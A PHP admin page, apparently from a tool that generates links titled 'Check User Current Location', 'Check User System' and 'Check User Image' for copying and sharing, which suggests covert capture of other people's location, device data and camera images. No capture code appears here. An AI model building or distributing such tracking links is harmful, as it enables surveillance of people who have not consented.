<?php
include_once('../backend/generate_token.php');

// Start session if not already started
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// Check if user is logged in, if not, redirect to login page
if (!isset($_SESSION['user_id'])) {
    header("Location: ../admin/login.php");
    exit();
}

// Define the URLs and their corresponding descriptions
$urls = array(
    "http://localhost/frontend/check-user-location/" => "Check User Current Location",
    "http://localhost/frontend/check-system/" => "Check User System",
    "http://localhost/win/capture-img/" => "Check User Image"
);

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="../assets/css/styles.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <title>Generate URLs</title>
</head>
<body>

<div class="container">
    <h1>Generated URLs</h1>

    <div class="url-container">
        <?php
        // Generate URLs with tokens and display them along with their descriptions
        foreach ($urls as $url => $description) {
            $urlWithToken = $url;
            echo "<div class='url'>
                      <span class='url-description'>$description:</span>
                      <a href='$urlWithToken' class='url-link'>$urlWithToken</a>
                      <button class='copy-button' onclick='copyToClipboard(\"$urlWithToken\")'>Copy</button>
                  </div>";
        }
        ?>
    </div>

    <script>
        function copyToClipboard(text) {
            var input = document.createElement('input');
            input.setAttribute('value', text);
            document.body.appendChild(input);
            input.select();
            document.execCommand('copy');
            document.body.removeChild(input);
            alert('URL copied to clipboard!');
        }
        function copyToClipboard(text) {
        var input = document.createElement('input');
        input.setAttribute('value', text);
        document.body.appendChild(input);
        input.select();
        document.execCommand('copy');
        document.body.removeChild(input);
        
        // Show SweetAlert2 popup message
        Swal.fire({
            icon: 'success',
            title: 'Copied!',
            text: 'URL copied to clipboard!',
            timer: 1000, // Display for 2 seconds
            showConfirmButton: false
        });
       }

    </script>
</div>

</body>
</html>
